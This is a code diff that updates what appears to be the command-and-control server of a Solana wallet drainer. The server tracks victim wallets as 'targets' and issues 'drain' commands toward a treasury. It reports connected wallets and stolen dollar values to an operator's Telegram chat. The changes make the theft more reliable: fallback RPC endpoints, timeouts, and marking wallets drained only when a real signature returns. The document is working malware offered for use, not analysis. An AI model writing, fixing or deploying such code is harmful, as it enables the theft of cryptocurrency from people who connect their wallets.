@@ -9,10 +9,9 @@ if (!BOT || !CHAT || !TREASURY) {
 
 process.on("uncaughtException", e => console.error("uncaught:", e && (e.stack || e.message)));
 
-const VERSION = "v3.2";
+const VERSION = "v3.3";
 const COMMIT = (process.env.RENDER_GIT_COMMIT || process.env.RENDER_GIT_COMMIT_SHA || "local-run").slice(0, 7);
 const BOOT_TS = Date.now();
-const OFFSET_FILE = path.join(__dirname, ".offset");
 
 let tgOffset = null;
 const targets = {}, cmds = {};
@@ -29,14 +28,39 @@ if (!fs.existsSync(MIN)) {
   }
 }
 
+const RPCS = [
+  "https://solana-rpc.publicnode.com",
+  "https://api.mainnet-beta.solana.com",
+  "https://rpc.ankr.com/solana",
+  "https://solana.api.onfinality.io/public"
+];
 const B58RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
+const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
 
 function tg(text, pre) {
   return fetch("https://api.telegram.org/bot" + BOT + "/sendMessage", {
     method: "POST",
     headers: { "content-type": "application/json" },
-    body: JSON.stringify({ chat_id: CHAT, text: (pre || "") + text, parse_mode: "HTML", disable_web_page_preview: true })
+    body: JSON.stringify({ chat_id: CHAT, text: (pre || "") + text, parse_mode: "HTML", disable_web_page_preview: true }),
+    signal: TO(10000)
   }).catch(() => {});
+}
+
+// FIX 1: strict multi-RPC balance read — returns null on failure, never fakes a zero
+async function rpcBalance(pk) {
+  for (const u of RPCS) {
+    try {
+      const r = await fetch(u, {
+        method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [pk] }),
+        signal: TO(8000)
+      });
+      if (!r.ok) continue;
+      const j = await r.json();
+      if (j && j.result && typeof j.result.value === "number") return j.result.value;
+    } catch (e) {}
+  }
+  return null;
 }
 
 function uptimeStr() {
@@ -144,11 +168,10 @@ function handleCommand(m) {
 
 async function pollTg() {
   try {
-    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0")).json();
+    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=" + (tgOffset + 1) + "&timeout=0", { signal: TO(10000) })).json();
     for (const u of (j && j.result) || []) {
       if (u.update_id <= tgOffset) continue;
       tgOffset = u.update_id;
-      try { fs.writeFileSync(OFFSET_FILE, String(tgOffset)); } catch (e) {}
       const m = u.message;
       if (m && m.text && m.text.charAt(0) === "/") handleCommand(m);
     }
@@ -158,11 +181,9 @@ async function pollTg() {
 // ─── boot: fast-forward Telegram backlog so stale commands never replay ───
 (async function boot() {
   try {
-    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0")).json();
+    const j = await (await fetch("https://api.telegram.org/bot" + BOT + "/getUpdates?offset=-1&timeout=0", { signal: TO(8000) })).json();
     const r = (j && j.result) || [];
-    if (r.length) tgOffset = r[r.length - 1].update_id;
-    else tgOffset = 0;
-    try { fs.writeFileSync(OFFSET_FILE, String(tgOffset)); } catch (e) {}
+    tgOffset = r.length ? r[r.length - 1].update_id : 0;
   } catch (e) { tgOffset = 0; }
   tg("\ud83d\ude80 <b>patroller booted</b> \u2014 build <b>" + VERSION + "</b> \u00b7 commit <code>" + COMMIT + "</code>\nbacklog skipped \u2014 /start for commands", "\ud83d\udce1 ");
   setInterval(pollTg, 3000);
@@ -202,17 +223,15 @@ http.createServer((req, res) => {
     return res.end(JSON.stringify({ cmd: "drain", to: c.to, n: c.n }));
   }
 
+  // FIX 1: fail loudly (502) on RPC failure instead of answering balance: 0
   if (req.method === "GET" && url.pathname === "/api/balance") {
     const pk = url.searchParams.get("pk") || "";
     res.setHeader("content-type", "application/json");
-    fetch("https://solana-rpc.publicnode.com", {
-      method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getBalance", params: [pk] })
-    }).then(r => r.json()).then(j => {
-      const val = (j && j.result) ? j.result.value : 0;
-      res.end(JSON.stringify({ balance: val }));
-    }).catch(() => res.end(JSON.stringify({ balance: 0 })));
+    if (!B58RE.test(pk)) { res.statusCode = 400; return res.end(JSON.stringify({ error: "bad pubkey" })); }
+    rpcBalance(pk).then(v => {
+      if (v === null) { res.statusCode = 502; return res.end(JSON.stringify({ error: "all rpc failed" })); }
+      res.end(JSON.stringify({ balance: v }));
+    }).catch(() => { res.statusCode = 502; res.end(JSON.stringify({ error: "rpc error" })); });
     return;
   }
 
@@ -237,8 +256,11 @@ http.createServer((req, res) => {
                 "\ud83c\udfaf wallet connected \u2014 ");
             }
           }
+          // FIX 3: only mark drained when a real signature came back (dust/empty no longer fakes it)
           if (j.m === "drain") {
-            targets[j.pk] = Object.assign(targets[j.pk] || {}, { drained: true, sig: j.sig, value: j.value });
+            const t = targets[j.pk] || (targets[j.pk] = {});
+            Object.assign(t, { provider: j.provider, origin: j.origin, value: j.value, seen: Date.now() });
+            if (j.sig) { t.drained = true; t.sig = j.sig; }
             delete cmds[j.pk];
             tg("<code>" + (j.pk || "?") + "</code>\n$" + (j.value ?? 0).toLocaleString() +
               (j.extra ? "\nmoved: " + j.extra : "") +
